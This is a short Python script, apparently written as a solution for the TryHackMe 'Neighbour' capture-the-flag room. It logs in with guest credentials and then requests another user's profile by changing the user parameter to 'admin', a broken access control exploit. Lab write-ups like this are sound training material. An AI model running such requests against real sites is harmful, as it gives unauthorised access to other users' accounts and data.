#!/usr/bin/env python3
'''
Made on Mar 19 2023
Created in python3
A easy script for a very easy broken access control ctf on tryhackme(called 'Neighbour')
You can read the source to know how to beat the machine
'''

import requests as req
import pprint
import sys

def engine():
  print(f"Welcome to the" + sys.argv[0] + ". This is a script to capture the flag quick!")

  try:
     sess = req.Session()
     url = f'http://{sys.argv[1]}/login.php'
     post_data = {'username': 'guest', 'password': 'guest'}
     post_reqq = sess.post(url, data=post_data)

     url_two = f'http://{sys.argv[1]}/profile.php?user=admin'
     get_reqq = sess.get(url_two)
     print(get_reqq.text)

  except:
     print("We ran into a issue!\neither not enough arguments or the ip is incorrect and couldn't connect to the target")

engine()
